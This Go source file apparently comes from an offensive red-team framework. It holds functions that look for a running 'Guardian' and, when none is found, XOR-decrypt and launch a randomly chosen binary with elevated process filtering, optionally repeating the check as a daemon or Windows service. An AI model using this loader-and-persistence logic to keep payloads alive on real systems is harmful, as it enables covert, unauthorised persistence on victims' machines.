// Copyright (C) 2020 - 2022 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package bolt

import (
	"context"
	"time"

	"github.com/iDigitalFlame/xmt/cmd/filter"
	"github.com/iDigitalFlame/xmt/data/crypto"
	"github.com/iDigitalFlame/xmt/device"
	"github.com/iDigitalFlame/xmt/man"
	"github.com/iDigitalFlame/xmt/util"
)

// Flurry will start the process of locating and triggering a Guardian.
//
// If a Guardian is not detected, this function will attempt to start a Bolt
// instance from the provided binary file list supplied.
//
// If 'k' is empty, we assume that the file contents are NOT encrypted, otherwise
// XOR encryption is used.
//
// If 'l' is nil, this will use the Pipe Linker.
func Flurry(l man.Linker, guard string, f []string, k []byte) {
	if len(f) == 0 {
		return
	}
	if man.Check(l, guard) {
		return
	}
	var (
		p   = filter.B(true).SetElevated(true)
		x   crypto.XOR
		s   *man.Sentinel
		err error
	)
	if len(k) > 0 {
		x = crypto.XOR(k)
	}
	for i := 0; i < 5; i++ {
		if s, err = man.Crypt(x, f[util.FastRandN(len(f))]); err != nil {
			continue
		}
		if s.Filter == nil {
			s.Filter = p
		}
		if _, err = s.Check(l, guard); err == nil {
			break
		}
	}
}

// FlurryService will start the process of locating and triggering a Guardian as
// a *nix daemon or a Windows service.
//
// If a Guardian is not detected, this function will attempt to start a Bolt
// instance from the provided binary file list supplied.
//
// If 'k' is empty, we assume that the file contents are NOT encrypted, otherwise
// XOR encryption is used.
//
// If 'l' is nil, this will use the Pipe Linker.
//
// The provided function arguments are the same as 'Flurry' but with the added
// service name (Windows only) and the time between Flurry checks as a Duration.
func FlurryService(t time.Duration, name string, l man.Linker, guard string, f []string, k []byte) {
	device.DaemonTicker(name, t, func(_ context.Context) error {
		Flurry(l, guard, f, k)
		return nil
	})
}
